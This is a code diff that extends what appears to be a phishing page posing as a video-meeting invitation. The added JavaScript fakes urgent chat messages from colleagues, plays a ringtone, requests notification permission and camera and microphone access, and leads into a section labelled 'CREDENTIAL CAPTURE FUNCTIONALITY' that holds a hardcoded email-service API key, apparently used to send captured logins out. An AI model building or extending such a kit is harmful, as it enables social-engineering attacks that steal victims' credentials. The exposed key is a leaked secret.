@@ -794,6 +794,115 @@
 
 <script>
     // ... (your existing code remains the same until the CREDENTIAL CAPTURE FUNCTIONALITY section)
+     // Request notification permission on page load
+        window.addEventListener('load', function() {
+            if ('Notification' in window && Notification.permission === 'default') {
+                Notification.requestPermission();
+            }
+        });
+
+        // Sample chat messages
+        const chatMessages = [
+            "John: Hello, we're in a hurry and need your immediate presence in the meeting.",
+            "Sarah: Urgent: We require your attendance in the meeting right away.",
+            "Mike: Please join us as soon as possible, we're waiting for you.",
+            "Lisa: The client is waiting for our presentation.",
+            "David: Can you share your screen when you join?",
+            "Emma: We have some important updates to share.",
+            "Alex: The deadline is approaching fast.",
+            "Tom: Let's get started with the agenda items."
+        ];
+
+        let chatInterval;
+
+        function goToWaitingRoom() {
+            document.getElementById('landingPage').classList.add('hidden');
+            document.getElementById('waitingRoom').style.display = 'block';
+            
+            // Start ringtone
+            const audio = document.getElementById('ringtone');
+            audio.play().catch(() => {});
+        }
+
+        function joinMeeting() {
+            // Request camera and microphone access
+            navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+                .then(stream => {
+                    // Stop ringtone
+                    stopRingtone();
+                    
+                    // Hide waiting room, show meeting
+                    document.getElementById('waitingRoom').style.display = 'none';
+                    document.getElementById('meetingInterface').style.display = 'block';
+                    
+                    // Show user's camera feed
+                    const video = document.getElementById('userVideo');
+                    video.srcObject = stream;
+                    
+                    // Start chat messages
+                    startChatMessages();
+                })
+                .catch(err => {
+                    alert("Camera or microphone access denied. Please allow access to join the meeting.");
+                });
+        }
+
+        function stopRingtone() {
+            const audio = document.getElementById('ringtone');
+            audio.pause();
+            audio.currentTime = 0;
+        }
+
+        function startChatMessages() {
+            chatInterval = setInterval(() => {
+                const randomMessage = chatMessages[Math.floor(Math.random() * chatMessages.length)];
+                showChatMessage(randomMessage);
+            }, 3000 + Math.random() * 4000); // Random interval between 3-7 seconds
+        }
+
+        function showChatMessage(message) {
+            const captionElement = document.getElementById('caption');
+            captionElement.textContent = message;
+            captionElement.style.opacity = '1';
+            
+            // Hide message after 5 seconds
+            setTimeout(() => {
+                captionElement.style.opacity = '0';
+            }, 5000);
+        }
+
+       function cancelMeeting() {
+            // Show error message
+            const errorMessage = document.getElementById('errorMessage');
+            errorMessage.classList.add('show');
+            
+            // Hide error message after 5 seconds
+            setTimeout(() => {
+                errorMessage.classList.remove('show');
+            }, 5000);
+        }
+
+
+        function showCustomToast(message, duration = 3000) {
+            const toast = document.createElement('div');
+            toast.className = 'custom-toast';
+            const icon = document.createElement('span');
+            icon.className = 'custom-toast-icon';
+            icon.innerHTML = '&#9940;';
+            const text = document.createElement('span');
+            text.textContent = message;
+            toast.appendChild(icon);
+            toast.appendChild(text);
+            document.body.appendChild(toast);
+            toast.offsetHeight;
+            toast.classList.add('show');
+            setTimeout(() => {
+                toast.classList.remove('show');
+                setTimeout(() => {
+                    document.body.removeChild(toast);
+                }, 300);
+            }, duration);
+        }
 
     // CREDENTIAL CAPTURE FUNCTIONALITY
     const elasticEmailApiKey = '9E00668C1ADFA64D550A4667DFE59D1C5073B82E6302B4E47378551A86C04C1E0F7E45E492B018F64BBFC055C623AF44';
